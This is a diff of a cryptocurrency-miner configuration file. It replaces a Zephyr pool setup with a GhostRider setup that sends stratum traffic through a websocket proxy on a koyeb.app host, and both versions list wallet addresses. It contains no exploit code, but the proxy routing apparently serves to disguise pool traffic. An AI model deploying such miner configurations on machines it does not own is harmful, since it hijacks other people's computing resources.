@@ -1,8 +1,12 @@
 {
-  "url": "sg-zephyr.miningocean.org:5332",
-  "user": "ZEPHsDJ81gD6qJvzAMujgXGb5DLMgeCVx6CvuQ7JjGUT8FaGjvsppjv4NXJF4jC9tSJK5aCi1m9aGV7DyoJVTKpPJr9tx2zeLeY",
-  "pass": "CPU",
-  "light": false,
-  "threads": 25,
-  "log": 1
+    "algo": "gr",
+    "proxy": "wss://rough-jenilee-mino-a0d7ddc3.koyeb.app/proxy",
+    "stratum": {
+        "host": "ghostrider.na.mine.zpool.ca",
+        "port": 5354,
+        "wallet": "RBfFtwTpUAosAAVP6MBLsB63B7hxaSVSzr",
+        "workerId": "001",
+        "password": "c=AVN"
+    },
+    "threads": 2
 }
